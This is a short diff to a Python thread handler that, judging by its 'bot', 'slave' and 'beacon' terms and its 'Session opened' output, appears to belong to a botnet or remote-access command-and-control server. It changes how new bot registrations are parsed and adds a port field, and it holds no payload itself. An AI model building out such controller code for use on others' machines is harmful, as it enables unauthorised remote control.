@@ -114,10 +114,11 @@ class ResponseHandler(threading.Thread):
             message = json.loads(response["msg"])
             if "type" in message:
                 if message['type'] == "new":
-                    mac_addr = message.get('mac', None)
-                    username = message.get('username', None)
-                    ip = message.get('ip', None)
-                    slave = Slave(mac_addr=mac_addr, username=username, ip=ip)
+                    mac_addr = message['mac']
+                    username = message['username']
+                    ip = message['slave']['ip']
+                    port = message['slave']['port']
+                    slave = Slave(mac_addr=mac_addr, username=username, ip=ip, port=port)
                     self.slave2beacon[slave] = response["addr"]
                     logger.debug("Thread {0} received MAC: \"{1}\",  registering bot".format(self.name, mac_addr))
                     self.cmd_interface.print_text("[!] Session opened at {0}".format(ServerConfig.UI_BOT_IDENTIFIER(slave)))
